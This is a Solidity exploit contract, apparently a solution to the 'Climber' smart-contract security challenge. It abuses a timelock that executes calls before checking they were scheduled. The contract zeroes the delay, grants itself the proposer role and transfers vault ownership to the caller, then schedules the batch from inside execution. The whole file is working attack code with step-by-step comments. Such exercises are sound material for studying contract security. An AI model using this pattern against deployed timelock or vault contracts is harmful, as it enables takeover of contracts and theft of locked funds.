// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../climber/ClimberTimelock.sol";
import "../climber/ClimberVault.sol";

contract ClimberAttack {
    ClimberTimelock public timelock;
    ClimberVault public vault;

    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;

    constructor(
        address payable _climberTimelockAddress,
        address _climberVaultAddress
    ) {
        timelock = ClimberTimelock(_climberTimelockAddress);
        vault = ClimberVault(_climberVaultAddress);
    }

    function attack() public {
        // Set delay to 0. We will able to instantly execute new tasks
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("updateDelay(uint64)", uint64(0))
        );

        // Give PROPOSER_ROLE to this contract, thanks that we have access to schedule function
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                bytes32(keccak256("PROPOSER_ROLE")),
                address(this)
            )
        );

        // Transfer ownership to the attacker account
        targets.push(address(vault));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("transferOwnership(address)", msg.sender)
        );

        //Sschedule the above tasks
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("schedule()"));

        timelock.execute(targets, values, dataElements, 0x00);
    }

    function schedule() public {
        timelock.schedule(targets, values, dataElements, 0x00);
    }
}
